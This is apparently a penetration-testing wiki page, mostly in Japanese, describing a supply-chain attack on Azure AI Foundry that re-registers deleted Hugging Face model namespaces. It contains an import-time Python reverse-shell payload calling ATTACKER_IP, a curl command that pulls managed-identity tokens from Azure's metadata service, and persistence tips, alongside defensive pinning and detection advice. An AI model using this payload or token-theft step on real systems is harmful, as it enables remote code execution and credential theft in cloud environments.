# Azure - AI Foundry Post-Exploitation via Hugging Face Model Namespace Reuse

{{#include ../../../banners/hacktricks-training.md}}

## シナリオ

- Azure AI Foundry Model Catalog には、ワンクリックでデプロイできる Hugging Face (HF) モデルが多数含まれています。
- HF のモデル識別子は Author/ModelName です。もし HF の author/org が削除されると、誰でもその author を再登録して同じ ModelName で旧パスにモデルを公開できます。
- 名前のみで取得する（commit pinning/integrity がない）pipelines や catalogs は、攻撃者がコントロールする repos に解決されます。Azure がモデルをデプロイすると、loader code がエンドポイント環境で実行され、そのエンドポイントの権限で RCE を得られる可能性があります。

一般的な HF の乗っ取りケース:
- 所有権の削除: 旧パスは乗っ取りされるまで 404 のままになります。
- 所有権の移転: 古い author が存在する間は旧パスが新しい author に 307 リダイレクトされます。もし古い author が後で削除され再登録されると、リダイレクトが壊れ、攻撃者の repo が旧パスで提供されます。

## 再利用可能な Namespace (HF) の特定
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>        # 200 exists, 404 deleted/available

# Check model path
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 -> redirect (transfer case), 404 -> deleted until takeover
```
## Azure AI Foundry に対するエンドツーエンド攻撃フロー

1) Model Catalog で、HF 上で元の作者が削除または移管され（old author removed）、放置された HF モデルを見つける。  
2) HF 上で放棄された作者を再登録し、ModelName を再作成する。  
3) インポート時に実行される、または trust_remote_code=True を要求する loader コードを含む悪意のある repo を公開する。  
4) Azure AI Foundry からレガシーの Author/ModelName をデプロイする。プラットフォームが攻撃者の repo をプルし、loader が Azure の endpoint 上の container/VM 内で実行され、endpoint 権限で RCE を獲得する。

インポート時に実行されるペイロードの断片（デモ用）：
```python
# __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # or powershell on Windows images

if os.environ.get("AZUREML_ENDPOINT","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
注意事項
- AI Foundry を統合する HF 対応のデプロイは、通常モデルの config で参照されるリポジトリモジュール（例: auto_map）をクローンして import し、code execution を引き起こす可能性があります。いくつかのパスでは trust_remote_code=True が必要です。
- アクセス権は通常エンドポイントの managed identity/service principal の権限に一致します。これを Azure 内でのデータアクセスや lateral movement のための initial access foothold として扱ってください。

## Post-Exploitation Tips (Azure Endpoint)

- 環境変数および MSI endpoints を列挙して tokens を取得／確認する:
```bash
# Azure Instance Metadata Service (inside Azure compute)
curl -H "Metadata: true" \
"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```
- 取得したトークンで、マウントされたストレージ、モデルアーティファクト、および到達可能な Azure services を確認する。
- プラットフォームが HF から再取得する場合に備えて、poisoned model artifacts を残して persistence を検討する。

## Azure AI Foundry ユーザー向けの防御ガイダンス

- HF からロードする際は、commit 単位でモデルを pin する:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- 検証済みの HF モデルを信頼できる内部レジストリにミラーし、そこからデプロイする。
- コードベースおよび defaults/docstrings/notebooks を継続的にスキャンし、削除または移管されたハードコーディングされた Author/ModelName を検出したら更新または pin する。
- デプロイ前に author の存在と model の出所を検証する。

## 検出ヒューリスティック (HTTP)

- 削除された author: author page 404; legacy model path 404 until takeover.
- 移管されたモデル: legacy path 307 to new author while old author exists; if old author later deleted and re-registered, legacy path serves attacker content.
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## 相互参照

- より広範な方法論およびサプライチェーンの注意点を参照してください:

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## 参考文献

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
